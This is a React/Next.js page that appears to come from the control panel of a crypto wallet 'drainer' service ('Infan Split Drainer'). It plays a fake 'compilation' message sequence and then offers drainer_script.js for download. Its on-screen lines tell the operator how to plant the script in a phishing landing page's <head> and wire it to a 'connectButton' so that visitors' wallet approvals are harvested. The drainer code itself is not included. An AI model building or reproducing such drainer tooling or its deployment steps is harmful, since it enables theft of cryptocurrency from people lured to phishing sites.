"use client";
import dynamic from "next/dynamic";
import React from "react";
import { useState, useEffect } from "react";
import DefaultLayout from "@/components/Layouts/DefaultLayout";
import styles from "./styles.module.css";

import { useRouter } from "next/navigation";

const ECommerce: React.FC = () => {
  const router = useRouter();

  const [currentLine, setCurrentLine] = useState(0);

  const lines = [
    "Waiting for your action, sweetie...",
    "Let's start the Infan Split Drainer compilation",
    "Reading all the configs and transmit the data",
    "Receiving a response from the server",
    "Your Drainer is Ready",
    "We collect all files, dependencies, js especially for you",
    "How to connect drainer to your landing:",
    "1) Download drainer .js file;",
    "2) Upload it to js folder;",
    "3) Open landing page (index.html) and paste code below in the beginning or after tag <head>:",
    '<script charset="UTF-8" async type="text/javascript" src="./drainer_script.js"></script>',
    "4) Link button by adding connectButton class",
    "Woooaa, all done! Have a good job and a lot of approvals",
  ];

  useEffect(() => {
    if (currentLine < lines.length) {
      const timer = setTimeout(() => {
        setCurrentLine(currentLine + 1);
      }, 700); // Adjust this timeout based on animation duration
      return () => clearTimeout(timer);
    }
  }, [currentLine]);

  return (
    <DefaultLayout>
      <center>
        <div className="w-[80%] bg-slate-900 rounded-md shadow-4 md:p-17 lg:p-17 p-8 font-medium text-[20px]">
          <div className="text-left">
            {lines.map((line, index) => (
              <p
                key={index}
                className={`${styles.guidePara} ${
                  index <= currentLine ? "" : styles.hidden
                }`}
                style={{
                  animation:
                    index === currentLine
                      ? `typewriter`
                      : "none",
                }}
              >
                {line}
              </p>
            ))}
          </div>
          {currentLine === lines.length && (
            <div>
              <p className={`${styles.guidePara}`}>
                Now you can return to the
                <a
                  className="text-white mx-2 cursor-pointer"
                  onClick={() => router.push("/dashboard")}
                >
                  home page.
                </a>
              </p>
              <a
                href="/data/drainer_script.js" // Path to the file in the public directory
                download="drainer_script.js" // Suggested filename for the downloaded file
              >
                <button className="bg-white bg-opacity-15 text-white p-5 rounded-2xl mt-7">
                  Download drainer script File
                </button>
              </a>
            </div>
          )}
        </div>
      </center>
    </DefaultLayout>
  );
};

export default ECommerce;
